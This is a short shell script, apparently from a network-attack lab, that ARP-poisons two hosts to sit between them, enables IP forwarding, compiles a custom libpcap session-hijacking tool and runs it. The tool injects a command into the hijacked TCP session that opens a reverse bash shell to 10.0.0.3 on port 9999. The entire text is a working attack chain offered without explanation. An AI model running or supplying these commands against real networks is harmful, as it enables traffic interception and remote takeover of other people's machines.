arpspoof -i h3-eth0 -t 10.0.0.1 -r 10.0.0.2 > /dev/null 2>&1 &
arpspoof -i h3-eth0 -t 10.0.0.2 -r 10.0.0.1 > /dev/null 2>&1 &

echo 1 > /proc/sys/net/ipv4/ip_forward
gcc  -o session_hijacking  checksum.c spoof.c session_hijacking.c -lpcap 
sudo ./session_hijacking 10.0.0.1 10.0.0.2  h3-eth0 "\r /bin/bash -i > /dev/tcp/10.0.0.3/9999  0<&1 \r" &

